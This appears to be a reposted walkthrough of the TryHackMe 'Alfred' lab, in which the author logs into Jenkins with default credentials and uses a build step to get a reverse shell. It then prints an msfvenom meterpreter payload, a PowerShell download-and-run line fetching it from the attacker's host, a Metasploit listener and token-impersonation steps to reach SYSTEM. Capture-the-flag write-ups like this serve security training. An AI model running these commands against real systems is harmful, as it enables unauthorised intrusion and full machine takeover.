> This is a dump from a blog post by bryan wendt. Too lazy to recreate
This is a walkthrough for the room: Alfred on TryHackMe. Let’s get started!
Initial Access

First question is asking about how many TCP ports are open, however it does note that the server will not respond to ping, so we need to run the -Pn option for our nmap scan.

We see that this is clearly a Microsoft server, and there is a website on port 80 and 8080. Let’s take a look!

Wow, poor Batman! We know we are looking for login information since the next question asks for it. So there has to be some sort of login page. Let’s try checking 8080.

Report this ad

Bingo! Now we still need a login. Let’s try some default credentials. After looking up Jenkins default credentials: admin:password trying that doesn’t work. Let’s try admin:admin. That works!

NOTE: I got lucky here by guessing default creds, but you could brute force this with hydra if it was more difficult.

Next, the room tells us to find a feature of the system that allows us to run commands. From there we can get a reverse shell on our machine using the command they give us.

If we navigate into the already created project, we can explore some more. Eventually, we get to Configure. In here under Build, we can run commands on the local system.

Before we do this, we need to download the script the room gives us (here) to our local machine. And then setup our python server:

python3 -m http.server 80

Then open a new terminal tab and start a netcat listener

nc -nvlp 1234

Now, let’s enter our commands we want the server to execute. (These are given to us)

Click Apply, Save then select Build Now. If you go to your netcat listener terminal, you should now have a shell!

Now that we are in, we can look for the user flag!

Alright! Next section.
Switching Shells

First step is to create our payload. Let’s open a new terminal and put in the commands given:

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<thm_vpn_ip> LPORT=1235 -f exe -o win_shell.exe

With the output, we get our next answer:

Now we need to download the payload to the machine. Utilize the command given and run it in our shell on the victim machine.

powershell "(New-Object System.Net.WebClient).Downloadfile('http://<thm_vpn_ip>:80/shell-name.exe','shell-name.exe')"

NOTE: If you stopped your Python webserver earlier, you will need to start that again under the folder where you save the payload: python3 -m http.server 80

Now, once again we need to start a listener, but since this is a meterpreter shell, we will need to use metasploit. Open a new terminal:

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 1235
run

Now that our listener is running, let’s start the payload by entering Start-Process "shell-name.exe" in the current shell on the victim machine.

You should now have a shell in metasploit!
Privilege Escalation

Let’s follow along with the instructions. Type shell and then whoami /priv

Exit the local shell: exit, and run the following:

load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid

Just like the room says, we need to migrate to a process that is running as NT AUTHORITY\SYSTEM. Lets run ps and look for the services.exe process

From here we can run the following command: migrate 668

There let’s get the root flag!

